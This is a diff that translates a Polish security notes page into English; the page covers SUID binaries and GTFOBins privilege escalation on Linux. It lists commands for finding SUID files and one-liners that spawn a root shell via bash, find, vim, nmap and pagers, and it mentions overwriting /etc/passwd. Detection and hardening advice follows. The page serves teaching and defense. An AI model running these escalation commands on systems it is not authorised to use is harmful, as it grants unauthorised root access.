@@ -12,40 +12,40 @@ author: "core"
 # SUID & GTFOBins
 
 ## TL;DR
-Binarka z bitem SUID uruchamia się z uprawnieniami właściciela (często root). Jeśli pozwala uruchomić shell/komendę/odczyt pliku — masz privesc. [GTFOBins](https://gtfobins.github.io/) katalog nadużyć.
+A binary with the SUID bit runs with its owner's privileges (often root). If it lets you spawn a shell/command/read a file — you have privesc. [GTFOBins](https://gtfobins.github.io/) catalogs the abuses.
 
-## Znajdowanie SUID
+## Finding SUID
 ```bash
 find / -perm -4000 -type f 2>/dev/null
-# z detalami
+# with details
 find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;
 ```
 
-## Typowe nadużycia (SUID → root shell)
+## Common abuses (SUID → root shell)
 ```bash
-# bash (SUID)      -> zachowaj uprawnienia -p
+# bash (SUID)      -> keep privileges with -p
 bash -p
 # find
 find . -exec /bin/sh -p \; -quit
 # vim
 vim -c ':py3 import os; os.execl("/bin/sh","sh","-pc","reset; exec sh -p")'
-# nmap (stare, tryb interaktywny)
-nmap --interactive   # potem: !sh
-# cp – nadpisz /etc/passwd lub skopiuj wrażliwy plik
-# less/more/man – z poziomu pagera: !/bin/sh
+# nmap (old, interactive mode)
+nmap --interactive   # then: !sh
+# cp – overwrite /etc/passwd or copy a sensitive file
+# less/more/man – from the pager: !/bin/sh
 ```
 
 ## Sudo vs SUID
-- `sudo -l` → nadużycie przez `sudo <binarka>` (GTFOBins sekcja *Sudo*).
-- SUID bit → nadużycie bez sudo (GTFOBins sekcja *SUID*).
+- `sudo -l` → abuse via `sudo <binary>` (GTFOBins *Sudo* section).
+- SUID bit → abuse without sudo (GTFOBins *SUID* section).
 
-## Wykrywanie (Blue Team)
-- Nowe pliki SUID poza baseline (`chmod u+s`) — alert.
-- auditd na `execve` znanych GTFOBins uruchamianych przez konta serwisowe.
+## Detection (Blue Team)
+- New SUID files outside baseline (`chmod u+s`) — alert.
+- auditd on `execve` of known GTFOBins run by service accounts.
 
-## Mitygacja / Hardening
-- Usuń SUID z binarek nieużywających go legalnie: `chmod u-s /path`.
-- Baseline SUID (AIDE/tripwire), mount `nosuid` gdzie się da.
+## Mitigation / Hardening
+- Remove SUID from binaries that don't legitimately need it: `chmod u-s /path`.
+- SUID baseline (AIDE/tripwire), `nosuid` mounts wherever possible.
 
-## Źródła
+## Sources
 - [GTFOBins](https://gtfobins.github.io/)
